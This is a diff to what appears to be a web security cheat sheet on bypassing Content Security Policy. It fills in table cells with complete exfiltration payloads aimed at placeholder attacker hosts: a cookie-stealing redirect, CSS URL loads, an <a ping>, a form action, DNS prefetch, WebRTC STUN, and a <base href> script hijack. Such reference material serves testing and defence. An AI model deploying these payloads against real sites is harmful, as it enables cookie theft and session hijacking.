@@ -185,11 +185,11 @@ When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration ch
 | DNS prefetch          | None (CSP cannot block DNS)    | `<link rel="dns-prefetch" href="//data.ATTACKER_HOST">`                |
 | WebRTC                | None (CSP cannot block)        | `new RTCPeerConnection({iceServers:[{urls:'stun:ATTACKER_HOST'}]})`    |
 | `<link rel=prefetch>` | `default-src` or `connect-src` | Often missed in CSP                                                   |
-| Redirect-based        | `navigate-to` (rarely set)     | `location='                   |
-| CSS injection         | `style-src`                    | `<style>body{background:url(     |
-| `<a ping>`            | `connect-src`                  | `<a ping=" href="#">click</a>`           |
+| Redirect-based        | `navigate-to` (rarely set)     | `location='ATTACKER_ORIGIN/?'+document.cookie`                        |
+| CSS injection         | `style-src`                    | `<style>body{background:url(ATTACKER_ORIGIN/?data)}</style>`         |
+| `<a ping>`            | `connect-src`                  | `<a ping="ATTACKER_ORIGIN/collect" href="#">click</a>`                 |
 | `report-uri` leak     | N/A                            | Trigger CSP violation → report contains blocked-uri with data         |
-| Form submission       | `form-action`                  | `<form action=" |
+| Form submission       | `form-action`                  | `<form action="ATTACKER_ORIGIN/"><button>Submit</button></form>`      |
 
 **DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.
 
@@ -326,7 +326,7 @@ setTimeout("alert(1)", 0);
   2.5 script-src 'strict-dynamic'
   Trust propagates from nonce/hash-trusted scripts.
 
-- Missing `base-uri`: `<base href=" → hijack relative `<script src="/js/app.js">`
+- Missing `base-uri`: `<base href="ATTACKER_ORIGIN/">` → hijack relative `<script src="/js/app.js">`
 - DOM XSS in trusted script → injected `<script>` inherits trust
 - Script gadgets: `document.createElement('script'); s.src = location.hash...` or `s.textContent = ...`
 
